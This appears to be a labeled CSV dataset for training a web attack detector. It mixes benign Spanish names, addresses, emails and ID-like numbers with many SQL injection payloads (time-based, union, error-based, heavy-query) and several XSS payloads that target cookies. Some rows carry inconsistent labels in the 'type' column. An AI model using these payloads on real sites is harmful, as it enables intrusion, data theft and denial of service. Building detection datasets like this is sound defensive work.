Text,attack_type,Label,type
iraci,norm,0,normal
gallego@cajucar.sn,norm,0,normal
ilve,norm,0,normal
"1' where 7036=7036;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
1ed6at0zacin,norm,0,normal
1') as xwlf where 9424=9424;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
"manuel de falla 119,",norm,0,normal
5462359635999525,norm,0,normal
emil,norm,0,normal
tejera,norm,0,normal
1')) and 7533=7533 and (('gvoh'='gvoh,sqli,1,normal
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'mvkg'='mvkg",sqli,1,sql
"1""))) union all select null,null,null,null,null,null--",sqli,1,sql
32425777d,norm,0,normal
seriano-reeggiero@distritoeste.pk,norm,0,normal
martens@ajuntamentbarcelona2-0.tl,norm,0,normal
"1'+(select iutk where 6158=6158;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",sqli,1,sql
muras,norm,0,normal
morn de almazn,norm,0,normal
"c/ pedro hidalgo, 137, 9?g",norm,0,normal
-4761 order by 1--,sqli,1,sql
bellvs,norm,0,normal
terraje,norm,0,normal
nuez de balboa 131 2-f,norm,0,normal
toi,norm,0,normal
"-2028%'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='",sqli,1,sql
4801521190112771,norm,0,normal
"-8506'))) union all select 1950,1950,1950,1950,1950,1950--",sqli,1,sql
"1"") where 6964=6964;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"c/ santa olaja, 121 2?d",norm,0,normal
correccionalmente,norm,0,normal
9185,norm,0,normal
deborah,norm,0,normal
aventino,norm,0,normal
1222164542017972,norm,0,normal
-2793') where 2621=2621 union all select 2621#,sqli,1,sql
robby7,norm,0,normal
1'))) rlike (select * from (select(sleep(5)))sgvo) and ((('npzh'='npzh,sqli,1,sql
1%' or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
18300,norm,0,normal
friera de valverde,norm,0,normal
hirotaka,norm,0,normal
"1 or elt(6272=6272,sleep(5))# klaw",sqli,1,normal
"1)) as shmg where 1371=1371 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"angel martin puebla 157,",norm,0,normal
"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",sqli,1,sql
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('opll' like 'opll",sqli,1,sql
"les llometes, 97 7?f",norm,0,normal
"1'+(select 'sbvh' where 8539=8539 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'",sqli,1,sql
dropin8,norm,0,sql
6687072478385848,norm,0,normal
da-1m1n,norm,0,normal
arcos,norm,0,normal
blancafort,norm,0,normal
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('gsup'='gsup",sqli,1,sql
"-3707""))) or 8571=8571--",sqli,1,sql
"1'+(select 'rguk' where 6019=6019 union all select null,null,null,null,null--",sqli,1,sql
03580,norm,0,normal
calzada rebassa,norm,0,normal
6e933ci39lo,norm,0,normal
"1%""))) and elt(9524=1124,1124) and (((""%""=""",sqli,1,normal
r57qu0ller3,norm,0,normal
malvina,norm,0,normal
gallenbe7,norm,0,normal
"1);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"av. pablo iglesias 106,",norm,0,normal
78258633y,norm,0,normal
"hornillos s/n,",norm,0,normal
"-3009'+(select 'gqbo' where 6915=6915 union all select 6915,6915--",sqli,1,sql
"1"") as pkkx where 6716=6716 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
"1%""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",sqli,1,sql
"1""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""yopd"" like ""yopd",sqli,1,sql
5003,norm,0,normal
8591363958180567,norm,0,normal
1%') and 6969=(select 6969 from pg_sleep(5)) and ('%'=',sqli,1,sql
chamsi,norm,0,normal
919,norm,0,normal
zarzosa,norm,0,normal
"-6377'||(select 'ryin' where 2113=2113 union all select 2113,2113,2113#",sqli,1,sql
"callejon sur, 93 13-c",norm,0,normal
1606552249491882,norm,0,normal
"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# ehsr",sqli,1,sql
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1,sql
lladorre,norm,0,normal
-3566%' or 2158=6289,sqli,1,normal
daciano,norm,0,normal
4296025977282656,norm,0,normal
orfebrera,norm,0,normal
espechar,norm,0,normal
sonsoles,norm,0,normal
19294,norm,0,normal
"1) and 3824=benchmark(5000000,md5(0x76555642))",sqli,1,normal
5537760506536596,norm,0,normal
"1"")) as hwlh where 1071=1071 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
1' or 6793=(select 6793 from pg_sleep(5)),sqli,1,sql
13593,norm,0,normal
' or '1' = '1,sqli,1,normal
69441548v,norm,0,normal
"1%"")) and 7533=7533 and ((""%""=""",sqli,1,normal
juan,norm,0,normal
2061277853418882,norm,0,normal
graciliano,norm,0,normal
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('eocx'='eocx,sqli,1,sql
23550240b,norm,0,normal
pesado,norm,0,normal
1)));select (case when (8331=5625) then 8331 else 8331*(select 8331 from mysql.db) end)#,sqli,1,sql
"alcatraz, 43, 2-g",norm,0,normal
<body onload=document.cookie=true;>,xss,2,xss
61371247w,norm,0,normal
"1%'))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='",sqli,1,sql
1)) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
cordelado,norm,0,normal
"1%') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('%'='",sqli,1,sql
"1 union all select null,null,null,null--",sqli,1,sql
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))# hkrp",sqli,1,normal
"1))) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (((1748=1748",sqli,1,normal
"-2855""))) union all select 1496,1496,1496,1496#",sqli,1,sql
ponferrada 65 10-c,norm,0,normal
natsume-dodsworth@obelix.km,norm,0,normal
eby@miplat.nl,norm,0,normal
dorra,norm,0,normal
"1%') and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1""));select case when 7717=7717 then 1 else null end--",sqli,1,sql
vento8eda4,norm,0,normal
"-7611) as tuje where 6101=6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",sqli,1,sql
"1,(select 6825 from(select count(*),concat(0x7171706a71,(select (elt(6825=6825,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
1') where 5491=5491 and 9198=9198--,sqli,1,sql
"-1256' in boolean mode) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",sqli,1,sql
"1"")) as bbkl where 5686=5686;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
"1 where 3175=3175 or 8421=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
co3tra3tiv7,norm,0,normal
41909752a,norm,0,normal
1) where 3671=3671;(select * from (select(sleep(5)))srmq)--,sqli,1,sql
"av. jose ferrandez cruz 182, 8b",norm,0,normal
largueado,norm,0,normal
"1 where 2751=2751 union all select null,null,null,null--",sqli,1,sql
"1%"" or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""",sqli,1,sql
alzucaray-randol@juanpolo.dz,norm,0,normal
buttons@creacionwebs.tm,norm,0,normal
"1' in boolean mode) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
01806,norm,0,normal
"1) as zodp where 9112=9112;select count(*) from generate_series(1,5000000)--",sqli,1,sql
"1"" where 2403=2403 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1"" and elt(4594=1040,1040)",sqli,1,normal
katherina,norm,0,normal
"-2872) where 8797=8797 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
margalef,norm,0,normal
1111,norm,0,normal
"1"";(select * from (select(sleep(5)))acdk)#",sqli,1,sql
amarilis,norm,0,normal
"1"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,1,sql
"calle parc catalunya, 116 10-b",norm,0,normal
16648,norm,0,normal
46630334l,norm,0,normal
"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",sqli,1,sql
coch soto,norm,0,normal
2169,norm,0,normal
san martn del castaar,norm,0,normal
a9i5t2d,norm,0,normal
brutsman@etnics.ms,norm,0,normal
"1"")) and 6486=3843 and ((""fbka"" like ""fbka",sqli,1,normal
"1"" where 6686=6686 or elt(6272=6272,sleep(5))--",sqli,1,sql
8937,norm,0,normal
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",sqli,1,sql
-2316'))) or 8519=6010,sqli,1,normal
"c/ aulencia, 84",norm,0,normal
"1'||(select 'ybfo' from dual where 3319=3319 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
clarette,norm,0,normal
"-2726"")) or elt(1032=1032,3623) and ((""ococ""=""ococ",sqli,1,normal
5452,norm,0,normal
"1%""))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""%""=""",sqli,1,sql
simeon,norm,0,normal
"1'))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
02131804a,norm,0,normal
barbieri guamanzara,norm,0,normal
"1) as cejp where 4736=4736 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
faix,norm,0,normal
1';begin user_lock.sleep(5); end--,sqli,1,sql
"1'))) and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"c/ peiscola, 95 3?g",norm,0,normal
2111805626623658,norm,0,normal
"-2071 union all select 4753,4753--",sqli,1,sql
90658868k,norm,0,normal
"1"") and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""fpqh""=""fpqh",sqli,1,sql
"1%') union all select null,null--",sqli,1,sql
5718,norm,0,normal
"-9179"") union all select 7144,7144,7144,7144,7144,7144,7144,7144--",sqli,1,sql
adolphe,norm,0,normal
1937545396216025,norm,0,normal
mohsen,norm,0,normal
84166910c,norm,0,normal
"1'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('%'='",sqli,1,sql
0565489653869351,norm,0,normal
"1 union all select null,null#",sqli,1,sql
la rioja,norm,0,normal
"1%') or elt(5873=5873,sleep(5))#",sqli,1,normal
1') where 6222=6222 or (select * from (select(sleep(5)))ydpu)--,sqli,1,sql
"1""))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((""ftjg""=""ftjg",sqli,1,sql
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",sqli,1,sql
grit57era,norm,0,normal
mim,norm,0,normal
5147466814822195,norm,0,normal
1 where 5359=5359 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
"1' where 9003=9003 and make_set(5868=8316,8316)--",sqli,1,sql
"1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1%')) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"-1<frameset><frame src=""javascript:document.cookie=true;""></frameset>",xss,2,xss
1') as xrap where 5523=5523 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
"1"")) and 6969=(select 6969 from pg_sleep(5)) and ((""nepk""=""nepk",sqli,1,sql
c/ virgen del rocio 57 6?f,norm,0,normal
17463,norm,0,normal
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
8747300653660135,norm,0,normal
7665578374246731,norm,0,normal
1');if(2697=2008) select 2697 else drop function jcoo--,sqli,1,sql
ginard xabe,norm,0,normal
09614,norm,0,normal
7689420873127697,norm,0,normal
michael,norm,0,normal
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('wweo'='wweo",sqli,1,sql
3117,norm,0,normal
de la cerda gassol,norm,0,normal
gaspard-birgel@indorec.kr,norm,0,normal
49694,norm,0,normal
28813,norm,0,normal
814ic4li4a,norm,0,normal
enris6rar,norm,0,normal
"1"");select pg_sleep(5) and (""pjql"" like ""pjql",sqli,1,sql
-5352%'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'=',sqli,1,sql
"1'+(select 'hrxp' where 5948=5948;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)+'",sqli,1,sql
getulio,norm,0,normal
pupinyo@multaspendientes.ve,norm,0,normal
ideimar,norm,0,normal
-3834')) as hhiy where 2086=2086 or 3038=3038,sqli,1,normal
didani,norm,0,normal
"c/ maestro faus, 77, 13?f",norm,0,normal
1'+(select 'wpnm' where 8223=8223 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq'))+',sqli,1,sql
"c/ alfabia, 147,",norm,0,normal
sauvanelex@gaudio.lk,norm,0,normal
"-4637"" where 8354=8354 or 1186=2714--",sqli,1,sql
brocatel,norm,0,normal
-8722%' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and '%'=',sqli,1,sql
todd,norm,0,normal
59973244p,norm,0,normal
20200,norm,0,normal
"-5355"" or make_set(9354=9354,7185)",sqli,1,normal
1976,norm,0,normal
946,norm,0,normal
villaeles de valdavia,norm,0,normal
baeza redon,norm,0,normal
46343482t,norm,0,normal
22232,norm,0,normal
22991,norm,0,normal
caravaca de la cruz,norm,0,normal
g66uin2,norm,0,normal
navas de tolosa 10 6?e,norm,0,normal
pactong,norm,0,normal
belva,norm,0,normal
"1""))) rlike (select * from (select(sleep(5)))sgvo) and (((""sdps""=""sdps",sqli,1,sql
"calle secretario aguilar 196, 4-c",norm,0,normal
1'))) rlike (select (case when (5855=7142) then 1 else 0x28 end)) and ((('fkhd'='fkhd,sqli,1,sql
-5449' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ryvy' like 'ryvy,sqli,1,sql
jaspe ochoa,norm,0,normal
"1""))) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"-1166')) as icdz where 1042=1042 union all select 1042,1042,1042,1042,1042#",sqli,1,sql
"1%"");select (case when (9732=7136) then 9732 else 9732*(select 9732 from information_schema.character_sets) end)#",sqli,1,sql
589ecialid6d,norm,0,normal
steinar,norm,0,normal
37120,norm,0,normal
san esteban de litera,norm,0,normal
8en7dill3,norm,0,normal
"1) as bgvd where 1753=1753 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
6815,norm,0,normal
"1'||(select 'mzsy' where 4940=4940 or elt(5873=5873,sleep(5))#",sqli,1,sql
"-5672%"" or 3825=9675--",sqli,1,sql
t5m3la,norm,0,normal
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (""pxbk"" like ""pxbk",sqli,1,sql
"1);iif(5462=8866,1,1/0)",sqli,1,sql
turus,norm,0,normal
kwang-ch,norm,0,normal
"1');select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
marshaus,norm,0,normal
66564863b,norm,0,normal
montoya,norm,0,normal
7701,norm,0,normal
"1"")));select count(*) from generate_series(1,5000000) and (((""wdbg"" like ""wdbg",sqli,1,sql
dierkes.casado5@firstchoicecoffee.ms,norm,0,normal
delujan,norm,0,normal
1755897947554799,norm,0,normal
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ibav'='ibav",sqli,1,sql
"camino de leganes, 13",norm,0,normal
"el reyezuelo, 15",norm,0,normal
7098,norm,0,normal
"1' in boolean mode);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)#",sqli,1,sql
dosaiges,norm,0,normal
9p30a,norm,0,normal
2502,norm,0,normal
seaman@salaparis.ws,norm,0,normal
"-6851') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('csfx'='csfx",sqli,1,sql
"(select * from generate_series(3906,3906,case when (3906=3906) then 1 else 0 end) limit 1)",sqli,1,sql
dalleto poroma,norm,0,normal
1'||(select 'sbip' from dual where 7302=7302 and (select * from (select(sleep(5)))fzno))||',sqli,1,sql
19109062h,norm,0,normal
"-1676'||(select 'xzmu' from dual where 6373=6373 union all select 6373,6373--",sqli,1,sql
bonfiglio cabanas,norm,0,normal
sonoe,norm,0,normal
lauderda,norm,0,normal
"1%'));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1)) as kycl where 8008=8008 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
samm@lawn.sn,norm,0,normal
"1') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
91512497m,norm,0,normal
-9340) where 5462=5462 or 3038=3038,sqli,1,normal
"1""));begin dbms_lock.sleep(5); end and ((""rqay"" like ""rqay",sqli,1,sql
1';begin user_lock.sleep(5); end and 'blit'='blit,sqli,1,sql
deshon7oso,norm,0,normal
vlahos,norm,0,normal
fernando,norm,0,normal
langellotti,norm,0,normal
arn pola,norm,0,normal
1%'));select pg_sleep(5)--,sqli,1,sql
scheppan-ishikawa@tuslimites.ly,norm,0,normal
"granada, la",norm,0,normal
"pl. comercial 54, 5d",norm,0,normal
aleksand,norm,0,normal
sripatimakul@forohh.ic,norm,0,normal
"1"") as ipxg where 4031=4031 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
de47aducha,norm,0,normal
"exp/*<xss style='no\\xss:noxss(""*//*"");",xss,2,sql
17132,norm,0,normal
"calle pravia 74,",norm,0,normal
"1 union all select null,null,null,null#",sqli,1,sql
caadillas almendro,norm,0,normal
"c/ san miguel, 111 6?f",norm,0,normal
"1')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('dreq'='dreq",sqli,1,normal
16216,norm,0,normal
"calle opera 197,",norm,0,normal
16192,norm,0,normal
"calle 300 al 8 del km. 1 puesta en riego 144,",norm,0,normal
lauriaul,norm,0,normal
17rgu1r7,norm,0,normal
maurizio,norm,0,normal
6467099706129021,norm,0,normal
"1 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
24806506v,norm,0,normal
olvera valdenebro,norm,0,normal
-3161') or 8501=1796,sqli,1,normal
1' where 5458=5458 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
jauregui cortines,norm,0,normal
otilio,norm,0,normal
zulmara,norm,0,normal
letemendia dou,norm,0,normal
1%'));if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
"1' where 8869=8869 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
suba9tacin,norm,0,normal
68101168p,norm,0,normal
5085,norm,0,normal
geesman,norm,0,normal
02637,norm,0,normal
"1%""))) rlike (select (case when (4442=4476) then 1 else 0x28 end)) and (((""%""=""",sqli,1,sql
"-1203"")) or 8571=8571--",sqli,1,sql
"1"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""bkrk""=""bkrk",sqli,1,sql
44420,norm,0,normal
"1' in boolean mode) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))#",sqli,1,sql
c/ gomera 148 3?e,norm,0,normal
donnerstag_carraro@hojainformativa.sv,norm,0,normal
pujals ogando,norm,0,normal
79140741h,norm,0,normal
"1' and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'imqi'='imqi",sqli,1,normal
3905556905973113,norm,0,normal
"1'+(select pepf where 5071=5071 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
0480040277538329,norm,0,normal
"1%')) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
0567191601469528,norm,0,normal
pl. herrera de los navarros 68 12-h,norm,0,normal
"-6363"") where 4043=4043 union all select 4043,4043,4043,4043,4043,4043,4043,4043,4043--",sqli,1,sql
"1));iif(1305=5656,1,1/0)",sqli,1,sql
fariba,norm,0,normal
1))) or (select * from (select(sleep(5)))ydpu) and (((3332=3332,sqli,1,sql
"1));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
cantabria,norm,0,normal
"-9966')) union all select 7230,7230,7230,7230,7230,7230,7230#",sqli,1,sql
sot143a82,norm,0,normal
"1'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('jwbt'='jwbt",sqli,1,sql
"c/ postigos de amaro s/n,",norm,0,normal
"c/ catedratico jose maria castro, 83",norm,0,normal
"1"";select pg_sleep(5)",sqli,1,sql
pizzanel,norm,0,normal
kent,norm,0,normal
8204676810796714,norm,0,normal
">""<script>alert(document.cookie)</script><div style=""1@gmail.com",xss,2,xss
real de montroi,norm,0,normal
"1%') and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1' and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'gzlz' like 'gzlz",sqli,1,sql
guoben,norm,0,normal
casiana,norm,0,normal
araero,norm,0,normal
c95cinaci7n,norm,0,normal
"1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"ildefonso cruz rodriguez, 93",norm,0,normal
-3648' where 4629=4629 order by 1--,sqli,1,sql
"1)) as xroy where 3274=3274;iif(3760=4785,1,1/0)",sqli,1,sql
reamonn,norm,0,normal
"c/ gerardo de alvear, 119 10f",norm,0,normal
"1')) as vqrt where 5173=5173 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
c/ enrique mensaque 95,norm,0,normal
1206132385577691,norm,0,normal
kirady,norm,0,normal
-4681 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# rltx,sqli,1,sql
hinton-s,norm,0,normal
68594124m,norm,0,normal
"1%""))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
4277,norm,0,normal
"1"") and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (""wfwg"" like ""wfwg",sqli,1,sql
alla,norm,0,normal
jocosamente,norm,0,normal
"1%')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('%'='",sqli,1,sql
1%') and 9198=9198--,sqli,1,sql
"1' where 7014=7014 or 8466=benchmark(5000000,md5(0x694a4745))--",sqli,1,sql
"plaza de san isidro 45,",norm,0,normal
"1""))) or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""rphs""=""rphs",sqli,1,normal
7249506139124391,norm,0,normal
12965,norm,0,normal
48340,norm,0,normal
munio@so-tel.bn,norm,0,normal
"-8436') as frmf where 7225=7225 or make_set(9354=9354,7185)--",sqli,1,sql
"-9003"")) union all select 9721,9721--",sqli,1,sql
palitroque,norm,0,normal
voseo,norm,0,normal
bertorelli,norm,0,normal
ratnam,norm,0,normal
"c/ australia 85,",norm,0,normal
acehche,norm,0,normal
rofes,norm,0,normal
1%'))) order by 1#,sqli,1,normal
3556606130011191,norm,0,normal
44561,norm,0,normal
0a04ale53,norm,0,normal
"1' and make_set(2942=8200,8200) and 'jnhv' like 'jnhv",sqli,1,normal
"<form id=""test"" /><button form=""test"" formaction=""javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))"">x",xss,2,xss
"-3013') where 2027=2027 union all select 2027,2027,2027,2027--",sqli,1,sql
1r0mentici2,norm,0,normal
caigua llobet,norm,0,normal
"1'+(select qtyi where 7147=7147;select count(*) from generate_series(1,5000000)--",sqli,1,sql
34514395c,norm,0,normal
"1"") as qwyt where 4236=4236 union all select null,null,null,null,null--",sqli,1,sql
c/ los granados s/n 13-a,norm,0,normal
"1"")) as yuqr where 7226=7226 and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
coursdev,norm,0,normal
"1'))) union all select null,null,null,null#",sqli,1,sql
"-1048%"" or 3038=3038",sqli,1,normal
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
alfama,norm,0,normal
1'||(select 'jmhb' where 1794=1794 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"1%');select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
